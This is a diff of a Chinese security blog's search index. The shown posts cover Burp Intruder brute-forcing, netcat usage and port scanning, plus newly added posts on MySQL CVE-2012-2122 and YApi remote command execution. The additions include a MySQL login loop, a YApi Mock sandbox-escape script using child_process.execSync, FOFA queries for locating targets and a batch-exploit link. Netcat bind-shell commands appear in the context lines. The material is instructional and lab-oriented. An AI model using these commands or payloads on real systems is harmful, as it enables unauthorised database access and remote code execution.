@@ -41,20 +41,20 @@
 </ol>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
     <title>使用Intruder模块爆破密码</title>
     <url>/2021/12/28/Intruder%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81/</url>
     <content><![CDATA[<h1 id="Intruder爆破密码"><a href="#Intruder爆破密码" class="headerlink" title="Intruder爆破密码"></a>Intruder爆破密码</h1><ol>
-<li>先通过<code>proxy</code>抓包发送数据<span id="more"></span></li>
+<li>先通过<code>proxy</code>抓包发送数据</li>
 <li><code>Postitions</code><ul>
-<li>根据业务选择<code>Attack type</code><br>  <a href="https://imgtu.com/i/Tsi7RK"><img data-src="https://s4.ax1x.com/2021/12/28/Tsi7RK.png" alt="Tsi7RK.png"></a></li>
-<li>设置变量<br>  <a href="https://imgtu.com/i/TsiHxO"><img data-src="https://s4.ax1x.com/2021/12/28/TsiHxO.png" alt="TsiHxO.png"></a></li>
+<li>根据业务选择<code>Attack type</code><br>  <a href="https://imgtu.com/i/Tsi7RK"><img data-src="https://s4.ax1x.com/2021/12/28/Tsi7RK.png" alt="Tsi7RK.png"></a><span id="more"></span>    - 设置变量
+  <a href="https://imgtu.com/i/TsiHxO"><img data-src="https://s4.ax1x.com/2021/12/28/TsiHxO.png" alt="TsiHxO.png"></a></li>
 </ul>
 </li>
 <li><code>Payloads</code><ul>
@@ -77,6 +77,7 @@
         <category>Burpsuite</category>
       </categories>
       <tags>
+        <tag>网络安全</tag>
         <tag>渗透</tag>
         <tag>Burpsuite</tag>
       </tags>
@@ -84,11 +85,11 @@
   <entry>
     <title>Linux中的常用命令</title>
     <url>/2021/12/28/Linux%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><span id="more"></span>
-<p><code>ls -lh</code> 显示大小单位</p>
+    <content><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p><code>ls -lh</code> 显示大小单位</p>
 <p><code>ls -lh --sort=size</code> 根据文件大小排序</p>
 <p><code>ls -lh --sort=time</code> 根据文件最后修改的时间排序</p>
 <p><code>ls -la</code> 显示所有文件，包括隐藏文件</p>
+<span id="more"></span>
 <p><code>cd 目录</code>  进入目录</p>
 <p><code>cat 文件</code> 显示文本文件所有内容</p>
 <p><code>more 文件</code> 显示文件内容 下面有个进度条，可以一行一行翻页看</p>
@@ -141,6 +142,40 @@
       </tags>
   </entry>
   <entry>
+    <title>Mysql 身份认证绕过漏洞（CVE-2012-2122）</title>
+    <url>/2022/01/05/Mysql%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2/</url>
+    <content><![CDATA[<h1 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
+<p>受影响版本：</p>
+<ul>
+<li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li>
+<li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.<span id="more"></span></li>
+</ul>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://www.freebuf.com/vuls/3815.html">http://www.freebuf.com/vuls/3815.html</a></li>
+<li><a href="https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/">https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/</a></li>
+</ul>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：</p>
+<pre><code class="Bash">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
+</code></pre>
+<ul>
+<li>使用<code>nmap -sV</code> 命令扫描目标ip地址 （nmap的具体使用方法请浏览我之前的博客）发现，靶机的mysql版本正好是可以利用漏洞的版本<br>  <img data-src="https://s4.ax1x.com/2022/01/05/TOxATH.png" alt="TOxATH.png"></li>
+<li>使用命令<pre><code class="Bash">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
+</code></pre>
+  <img data-src="https://s4.ax1x.com/2022/01/05/TOxk0e.png" alt="TOxk0e.png"></li>
+</ul>
+<p>发现成功进入，该漏洞存在</p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Mysql</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Netcat的几种常用方式</title>
     <url>/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/</url>
     <content><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h2><ul>
@@ -153,8 +188,8 @@
 <span id="more"></span>
 <h2 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h2><ul>
 <li>A: <code>nc -l -p 4444</code> A服务器开放一个4444端口侦听（服务端）</li>
-<li>B: <code>nc -nv ip 4444</code> 连接A服务器的4444端口（客户端）<br>  <a href="https://imgtu.com/i/TsrCsx"><img data-src="https://s4.ax1x.com/2021/12/28/TsrCsx.png" alt="TsrCsx.png"></a></li>
-<li>远程电子取证信息收集<br>  <a href="https://imgtu.com/i/TsrFeK"><img data-src="https://s4.ax1x.com/2021/12/28/TsrFeK.png" alt="TsrFeK.png"></a><br>  同理  可以 <code>ps aux | nc -nv ip port</code> 输出进程信息 查看有没有可疑的进程<ul>
+<li>B: <code>nc -nv ip 4444</code> 连接A服务器的4444端口（客户端）<br>  <img data-src="https://s4.ax1x.com/2021/12/28/TsrCsx.png" alt="TsrCsx.png"></li>
+<li>远程电子取证信息收集<br>  <img data-src="https://s4.ax1x.com/2021/12/28/TsrFeK.png" alt="TsrFeK.png"><br>  同理  可以 <code>ps aux | nc -nv ip port</code> 输出进程信息 查看有没有可疑的进程<ul>
 <li>写入文件<ul>
 <li>A: <code>nc -l -p 333 &gt; ps.txt</code> 开放端口并将后续收集的信息写入 ps.txt</li>
 <li>B: <code>ps aux | nc -nv ip port -q 1</code>   -q 1的意思是，完成任务后等待1秒退出-断开连接，不退出会一直进行tcp连接无法判断是否未完成</li>
@@ -168,20 +203,18 @@
 <li>相当于是一个可上传文件的 ftp服务器</li>
 <li>传输文件<ul>
 <li>A: <code>nc -lp 333 &gt; 1.mp4 q 1</code> A接收端 侦听333端口 输出到1.mp4 &gt;输出</li>
-<li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q -1</code> B发送端 输入文件 到A  &lt;输入<br>正向传输<br><a href="https://imgtu.com/i/TsrVFe"><img data-src="https://s4.ax1x.com/2021/12/28/TsrVFe.png" alt="TsrVFe.png"></a></li>
+<li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q -1</code> B发送端 输入文件 到A  &lt;输入<br>正向传输<br><img data-src="https://s4.ax1x.com/2021/12/28/TsrVFe.png" alt="TsrVFe.png"></li>
 <li>或</li>
 <li>A: <code>nc -q 1 -lp 333 &lt; a.mp4</code> A发送端 输入文件  等待其他连接，如果被连接 文件流入到对方电脑 并在1秒后断开连接</li>
-<li>B: <code>nc -nv 1.1.1.1 333 &gt; a.mp4</code> B接收端和A建立连接 接收A的文件<br>反向传输<br><a href="https://imgtu.com/i/TsrZJH"><img data-src="https://s4.ax1x.com/2021/12/28/TsrZJH.png" alt="TsrZJH.png"></a></li>
-</ul>
-</li>
-<li>传输目录<ul>
+<li>B: <code>nc -nv 1.1.1.1 333 &gt; a.mp4</code> B接收端和A建立连接 接收A的文件<br>反向传输<br><img data-src="https://s4.ax1x.com/2021/12/28/TsrZJH.png" alt="TsrZJH.png"></li>
+<li>传输目录</li>
 <li>A: <code>tar -cvf 目录 | nc -lp 333 -q 1</code> A发送 先把前面的目录打包成tar文件，然后开放333端口 等待连接，如果连接 就发送打包的tar包，等待一秒断开连接</li>
 <li>B: <code>nc 1.1.1.1 333 | tar -zxf -</code> B接收 和A建立连接，接收打包的tar 目录，然后进行解压命令，目录就过来了<br>也可以进行反向传输</li>
 </ul>
 </li>
 <li>加密传输<ul>
 <li>A: <code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &lt; 1.mp4</code> A接收端 开放333端口等待连接 接收加密文件，然后将加密的文件内容重定向给 mcrypt解密，解密后在重定向保存成文件</li>
-<li>B: <code>mcrypt --flush -Fbq -a rljndael-256 -m ecb &lt; 1.mp4 | nc -nv 1.1.1.1 333 q 1</code> B发送端 先使用加密算法对 文件内容进行加密，然后把加密后的文件内容作为一个输入，再把加密文件 传输给nc 去连接对方的ip+端口 ，如果对方是等待连接的状态，就会直接发送，成功，等待1秒断开连接<br><a href="https://imgtu.com/i/TsruQI"><img data-src="https://s4.ax1x.com/2021/12/28/TsruQI.png" alt="TsruQI.png"></a><br>mcrypt 默认是没有安装的，需要自行安装<br><code>apt-get install mcrypt</code></li>
+<li>B: <code>mcrypt --flush -Fbq -a rljndael-256 -m ecb &lt; 1.mp4 | nc -nv 1.1.1.1 333 q 1</code> B发送端 先使用加密算法对 文件内容进行加密，然后把加密后的文件内容作为一个输入，再把加密文件 传输给nc 去连接对方的ip+端口 ，如果对方是等待连接的状态，就会直接发送，成功，等待1秒断开连接<br><img data-src="https://s4.ax1x.com/2021/12/28/TsruQI.png" alt="TsruQI.png">]<br>mcrypt 默认是没有安装的，需要自行安装<br><code>apt-get install mcrypt</code></li>
 </ul>
 </li>
 </ul>
@@ -206,7 +239,7 @@
 <h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><ul>
 <li>正向:<ul>
 <li>A: <code>nc -lp 333 -c bash</code> -c 连接一个shell A服务端开放333 传递bash shell</li>
-<li>B: <code>nc 1.1.1.1 333</code> B客户端 连接 控制A bash shell<br>远程控制的权限取决于 发出建立连接的用户<br><a href="https://imgtu.com/i/Tsrlef"><img data-src="https://s4.ax1x.com/2021/12/28/Tsrlef.png" alt="Tsrlef.png"></a></li>
+<li>B: <code>nc 1.1.1.1 333</code> B客户端 连接 控制A bash shell<br>远程控制的权限取决于 发出建立连接的用户<br><img data-src="https://s4.ax1x.com/2021/12/28/Tsrlef.png" alt="Tsrlef.png"></li>
 </ul>
 </li>
 <li>反向:<ul>
@@ -233,7 +266,7 @@
         <category>Netcat</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
         <tag>Netcat</tag>
       </tags>
   </entry>
@@ -298,9 +331,10 @@
 </ul>
 ]]></content>
       <categories>
-        <category>扫描技术</category>
+        <category>网络安全</category>
       </categories>
       <tags>
+        <tag>网络安全</tag>
         <tag>渗透</tag>
         <tag>扫描技术</tag>
       </tags>
@@ -500,22 +534,123 @@
       </tags>
   </entry>
   <entry>
+    <title>Yapi远程任意命令执行漏洞</title>
+    <url>/2022/01/05/Yapi%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Yapi远程任意命令执行漏洞"><a href="#Yapi远程任意命令执行漏洞" class="headerlink" title="Yapi远程任意命令执行漏洞"></a>Yapi远程任意命令执行漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。</p>
+<p>安全人员在Yapi官方Github仓库提交了漏洞issues，地址为:<a href="https://links.jianshu.com/go?to=https://github.com/YMFE/yapi/issues/2233">https://github.com/YMFE/yapi/issues/2233</a>。</p>
+<span id="more"></span>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。</p>
+<p>YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代</p>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><p>app=”YApi”</p>
+<p>icon_hash=”-715193973”</p>
+<h2 id="Yapi部署教程"><a href="#Yapi部署教程" class="headerlink" title="Yapi部署教程"></a>Yapi部署教程</h2><p>使用Docker构建Yapi(Ubuntu环境)。</p>
+<p>启动mongodb。</p>
+<p>docker run -d –name mongo-yapi -p 27017:27017 mongo</p>
+<p>获取 Yapi 镜像，版本信息可在 阿里云镜像仓库查看</p>
+<p>docker pull <a href="http://registry.cn-hangzhou.aliyuncs.com/anoy/yapi">registry.cn-hangzhou.aliyuncs.com/anoy/yapi</a></p>
+<p>自定义配置文件挂载到目录/api/config.json，宿主机/config/config.json 内容为以下代码：</p>
+<p>{</p>
+<p>“port”: “3000”,</p>
+<p>“adminAccount”: “<a href="mailto:admin@qq.com">admin@qq.com</a>“,</p>
+<p>“db”: {</p>
+<p>“servername”: “mongo-yapi”,</p>
+<p>“DATABASE”: “yapi”,</p>
+<p>“port”: 27017</p>
+<p>},</p>
+<p>“mail”: {</p>
+<p>“enable”: true,//邮件通知</p>
+<p>“host”: “<a href="http://smtp.qq.com/">smtp.qq.com</a>“,//邮箱服务器</p>
+<p>“port”: 465,</p>
+<p>“from”: “<a href="mailto:admin@qq.com">admin@qq.com</a>“,//发件人邮箱</p>
+<p>“auth”: {</p>
+<p>“user”: “<a href="mailto:adminadmin@qq.com">adminadmin@qq.com</a>“,//邮箱服务器账号</p>
+<p>“pass”: “123456”//邮箱服务器密码</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>初始化Yapi数据库索引及管理员账号。</p>
+<p>docker run -it –rm \</p>
+<p>-v /config/config.json:/api/config.json \</p>
+<p>–link mongo-yapi:mongo \</p>
+<p>–entrypoint npm \</p>
+<p>–workdir /api/vendors \</p>
+<p><a href="http://registry.cn-hangzhou.aliyuncs.com/anoy/yapi">registry.cn-hangzhou.aliyuncs.com/anoy/yapi</a> \</p>
+<p>run install-server</p>
+<p>启动Yapi服务。</p>
+<p>docker run -d \</p>
+<p>-v /config/config.json:/api/config.json \</p>
+<p>–name yapi \</p>
+<p>–link mongo-yapi:mongo \</p>
+<p>–workdir /api/vendors \</p>
+<p>-p 3000:3000 \</p>
+<p><a href="http://registry.cn-hangzhou.aliyuncs.com/anoy/yapi">registry.cn-hangzhou.aliyuncs.com/anoy/yapi</a> \</p>
+<p>server/app.js</p>
+<p>访问<a href="https://links.jianshu.com/go?to=http://localhost:3000">http://localhost:3000</a>登录账号<a href="https://links.jianshu.com/go?to=mailto:admin@qq.com">admin@qq.com</a>，密码 123456。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="注册用户"><a href="#注册用户" class="headerlink" title="注册用户"></a>注册用户</h3><p>利用前提为Yapi开启了注册功能，打开靶机地址，注册一个账号。</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-1b4c9efb9998bbd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp"></p>
+<h3 id="添加项目"><a href="#添加项目" class="headerlink" title="添加项目"></a>添加项目</h3><p>添加一个项目。</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-39ba90a3ad0e206f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<p>输入项目名称，输入完成后点击创建名称</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-2e839e8937c2f8e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<h3 id="添加接口"><a href="#添加接口" class="headerlink" title="添加接口"></a>添加接口</h3><p>点击添加接口</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-fe731408c86ab139.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<p>输入接口名称和接口路径，输入完成后点击提交</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-c65887c77f6e6696.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1080/format/webp"></p>
+<h3 id="添加Mock脚本"><a href="#添加Mock脚本" class="headerlink" title="添加Mock脚本"></a>添加Mock脚本</h3><p>点击高级Mock，并打开脚本页面</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-f7e6ab090f905da9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<p>开启脚本，输入Mock脚本</p>
+<p>脚本内容:</p>
+<pre><code class="Bash">const sandbox = this
+
+const ObjectConstructor = this.constructor
+
+const FunctionConstructor = ObjectConstructor.constructor
+
+const myfun = FunctionConstructor('return process')
+
+const process = myfun()
+
+mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
+</code></pre>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-3fdab1a454ef95ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<p>点击保存，打开预览界面。访问Mock地址即可执行命令。</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-dbda01bc58f872a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"></p>
+<h3 id="访问Mock地址"><a href="#访问Mock地址" class="headerlink" title="访问Mock地址"></a>访问Mock地址</h3><p>成功获取当前用户</p>
+<p><img data-src="//upload-images.jianshu.io/upload_images/3946030-e0dae064a2997aa8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/850/format/webp"></p>
+<p>可将Mock脚本中的whoami改成任意语句，可执行反弹shell等操作。</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>该漏洞暂无补丁。</p>
+<p>临时修复建议：</p>
+<ol>
+<li>关闭YAPI用户注册功能，以阻断攻击者注册。</li>
+<li>利用请求白名单的方式限制 YAPI 相关端口。</li>
+<li>排查 YAPI 服务器是否存在恶意访问记录。</li>
+</ol>
+<p>批量脚本：<a href="https://raw.githubusercontent.com/ad-calcium/vuln_script/main/Yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.py">https://raw.githubusercontent.com/ad-calcium/vuln_script/main/Yapi远程命令执行漏洞.py</a></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于Web</title>
     <url>/2021/12/28/web%E6%98%AF%E4%BB%80%E4%B9%88/</url>
-    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB的组成架构模型？"><a href="#WEB的组成架构模型？" class="headerlink" title="WEB的组成架构模型？"></a>WEB的组成架构模型？</h2><span id="more"></span>
-<p>网站源码：分脚本类型，分应用方向</p>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB的组成架构模型？"><a href="#WEB的组成架构模型？" class="headerlink" title="WEB的组成架构模型？"></a>WEB的组成架构模型？</h2><p>网站源码：分脚本类型，分应用方向</p>
 <p>操作系统：windows linux</p>
 <p>中间件（搭建平台）：apache iis tomcat nginx等</p>
 <p>数据库：access mysql mssql oracle sybase db2 postsql等</p>
+<span id="more"></span>
 <hr>
 <h2 id="架构漏洞安全测试简要介绍？"><a href="#架构漏洞安全测试简要介绍？" class="headerlink" title="架构漏洞安全测试简要介绍？"></a>架构漏洞安全测试简要介绍？</h2><hr>
 <h2 id="为什么要从WEB层面为主为首？"><a href="#为什么要从WEB层面为主为首？" class="headerlink" title="为什么要从WEB层面为主为首？"></a>为什么要从WEB层面为主为首？</h2><p>用户接触web层面最多，大部分都是从web页面入手慢慢渗透到服务器。直接从操作系统入手不太现实（大部分情况下接触不到）。</p>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -532,9 +667,16 @@
         <category>SQL注入</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
         <tag>SQL注入</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>免责声明</title>
+    <url>/2022/01/05/%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E/</url>
+    <content><![CDATA[<p>本博客教学内容仅供学习交流使用，请勿用于违法犯罪行为。</p>
+<p>不得用于从事违反中国人民共和国相关法律所禁止的活动，由此导致的任何法律问题与博主和开发人员无关。</p>
+]]></content>
   </entry>
   <entry>
     <title>关于端口扫描</title>
@@ -587,7 +729,7 @@
 <li>全连接扫描</li>
 <li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li>
 </ul>
-<p><a href="https://imgtu.com/i/TssM9J"><img data-src="https://s4.ax1x.com/2021/12/28/TssM9J.png" alt="TssM9J.png"></a></p>
+<p><a href="https://s4.ax1x.com/2021/12/28/TssM9J.png">TssM9J.png</a>]</p>
 <hr>
 <h2 id="隐蔽扫描——SYN"><a href="#隐蔽扫描——SYN" class="headerlink" title="隐蔽扫描——SYN"></a>隐蔽扫描——SYN</h2><ul>
 <li>不建立完整连接</li>
@@ -608,7 +750,7 @@
 </ul>
 </li>
 </ul>
-<p><a href="https://imgtu.com/i/TssQ39"><img data-src="https://s4.ax1x.com/2021/12/28/TssQ39.png" alt="TssQ39.png"></a></p>
+<p><a href="https://s4.ax1x.com/2021/12/28/TssQ39.png">TssQ39.png</a></p>
 <hr>
 <h2 id="隐蔽端口扫描"><a href="#隐蔽端口扫描" class="headerlink" title="隐蔽端口扫描"></a>隐蔽端口扫描</h2><ul>
 <li>Syn——syn/ack——rst</li>
@@ -649,21 +791,19 @@
 </ul>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
         <tag>扫描技术</tag>
       </tags>
   </entry>
   <entry>
     <title>如何同时运行多个tomcat</title>
     <url>/2021/12/28/%E5%90%8C%E6%97%B6%E8%BF%90%E8%A1%8C%E5%A4%9A%E4%B8%AAtomcat/</url>
-    <content><![CDATA[<h1 id="同时运行多个tomcat"><a href="#同时运行多个tomcat" class="headerlink" title="同时运行多个tomcat"></a>同时运行多个tomcat</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>配置好jdk</p>
-<span id="more"></span>
-<hr>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>下载tomcat到服务器中，并解压到文件夹，如<code>/home/tomcat/tomcat1</code></p>
+    <content><![CDATA[<h1 id="同时运行多个tomcat"><a href="#同时运行多个tomcat" class="headerlink" title="同时运行多个tomcat"></a>同时运行多个tomcat</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><h2 id="配置好jdk"><a href="#配置好jdk" class="headerlink" title="配置好jdk"></a>配置好jdk</h2><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>下载tomcat到服务器中，并解压到文件夹，如<code>/home/tomcat/tomcat1</code></p>
 <p>再复制一份tomcat压缩包，解压到&nbsp;<code>/home/tomcat/tomcat2</code></p>
+<span id="more"></span>
 <hr>
 <h2 id="第三步：配置tomcat环境变量（重点）"><a href="#第三步：配置tomcat环境变量（重点）" class="headerlink" title="第三步：配置tomcat环境变量（重点）"></a>第三步：配置tomcat环境变量（重点）</h2><p>同样是操作  <code>etc/profile</code>文件。</p>
 <p>然后在文件最后一行，即刚刚添加JDK环境变量的后边添加如下配置：</p>
@@ -697,7 +837,7 @@ export CATALINA_HOME6=/home/tomcat/tomcat8.5_6
 export CATALINA_BASE6=/home/tomcat/tomcat8.5_6
 export TOMCAT_HOME6=/home/tomcat/tomcat8.5_6
 </code></pre>
-<p><a href="https://imgtu.com/i/TskPt1"><img data-src="https://s4.ax1x.com/2021/12/28/TskPt1.png" alt="TskPt1.png"></a></p>
+<p><img data-src="https://s4.ax1x.com/2021/12/28/TskPt1.png" alt="TskPt1.png"></p>
 <p>(注意：tomcat123456中的配置命名)</p>
 <p>加载资源</p>
 <p><code>source /etc/profile</code></p>
@@ -757,8 +897,8 @@ redirectPort="8443" /&gt;
 </code></pre>
 <p>其他同理</p>
 <hr>
-<h1 id="最后：验证结果"><a href="#最后：验证结果" class="headerlink" title="最后：验证结果"></a>最后：验证结果</h1><p><a href="https://imgtu.com/i/TskA1K"><img data-src="https://s4.ax1x.com/2021/12/28/TskA1K.png" alt="TskA1K.png"></a></p>
-<p><a href="https://imgtu.com/i/TskVXD"><img data-src="https://s4.ax1x.com/2021/12/28/TskVXD.png" alt="TskVXD.png"></a></p>
+<h1 id="最后：验证结果"><a href="#最后：验证结果" class="headerlink" title="最后：验证结果"></a>最后：验证结果</h1><p><img data-src="https://s4.ax1x.com/2021/12/28/TskA1K.png" alt="TskA1K.png"></p>
+<p><img data-src="https://s4.ax1x.com/2021/12/28/TskVXD.png" alt="TskVXD.png"></p>
 ]]></content>
       <categories>
         <category>Tomcat</category>
@@ -777,10 +917,10 @@ redirectPort="8443" /&gt;
 <h2 id="关于后门需要了解哪些？（玩法、免杀）"><a href="#关于后门需要了解哪些？（玩法、免杀）" class="headerlink" title="关于后门需要了解哪些？（玩法、免杀）"></a>关于后门需要了解哪些？（玩法、免杀）</h2><p>免杀，简单来讲就是绕过杀毒软件等。</p>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -807,11 +947,10 @@ redirectPort="8443" /&gt;
 <h2 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h2><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
-        <tag>域名</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -826,7 +965,7 @@ redirectPort="8443" /&gt;
 <ol>
 <li>服务端配置(frps-公网)<ul>
 <li>首先删除关于<code>frpc</code> 的所有文件</li>
-<li>然后编辑<code>frps.ini</code><br><code>vim ./frps.ini</code><br><a href="https://imgtu.com/i/TBZalT"><img data-src="https://s4.ax1x.com/2021/12/27/TBZalT.png" alt="TBZalT.png"></a></li>
+<li>然后编辑<code>frps.ini</code><br><code>vim ./frps.ini</code><br><img data-src="https://s4.ax1x.com/2021/12/27/TBZalT.png" alt="TBZalT.png"></li>
 <li>打开防火墙7000端口（c/s通信）和6000端口（映射的内网 22端口）</li>
 </ul>
 </li>
@@ -959,20 +1098,46 @@ HandleLidSwitch 合上笔记本盖后的行为，默认suspend
 </ol>
 ]]></content>
       <categories>
-        <category>网络</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>网络</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何扫描网站后台——DirBuster</title>
+    <url>/2021/12/19/%E5%A6%82%E4%BD%95%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E2%80%94%E2%80%94DirBuster/</url>
+    <content><![CDATA[<h1 id="如何扫描网站后台——DirBuster"><a href="#如何扫描网站后台——DirBuster" class="headerlink" title="如何扫描网站后台——DirBuster"></a>如何扫描网站后台——DirBuster</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>该工具默认集成在Kali系统中</p>
+<p>为了方便起见笔者在这里演示直接以Kali系统为例</p>
+<p>工具的路径为: <code>/usr/shre/dirbuster</code></p>
+<span id="more"></span>
+<ol>
+<li><code>cd /usr/shar/dirbuster</code>进入路径后查看，会看到目录下的jar文件<br> <img data-src="https://s4.ax1x.com/2021/12/29/Tgfo9I.png" alt="Tgfo9I.png"></li>
+<li><code>java -jar DirBuster-1.0-RC1.jar</code> 打开jar文件<br> <img data-src="https://s4.ax1x.com/2021/12/29/TgfT3t.png" alt="TgfT3t.png"></li>
